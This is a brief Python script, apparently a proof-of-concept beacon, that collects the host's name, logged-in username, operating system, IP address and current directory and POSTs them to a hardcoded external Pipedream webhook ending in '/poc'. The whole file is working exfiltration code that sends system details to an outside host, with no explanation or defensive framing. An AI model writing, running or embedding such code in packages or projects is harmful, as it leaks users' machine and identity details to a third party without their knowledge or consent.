import os
import socket
import platform
import requests

def send_info_to_server(server_url):
    hostname = socket.gethostname()

    username = os.getlogin()

    osname = platform.system()

    ip = socket.gethostbyname(hostname)

    current_directory = os.getcwd()

    data = {
        "hostname": hostname,
	"username": username,
        "osname": osname,
        "current_directory": current_directory,
	"ip": ip
    }

    try:
        response = requests.post(server_url, json=data)
        if response.status_code == 200:
            print("ok")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error: {str(e)}")

def main():
    server_url = "https://eoi6u1biqlryi7h.m.pipedream.net/poc"
    send_info_to_server(server_url)

if __name__ == "__main__":
    main()

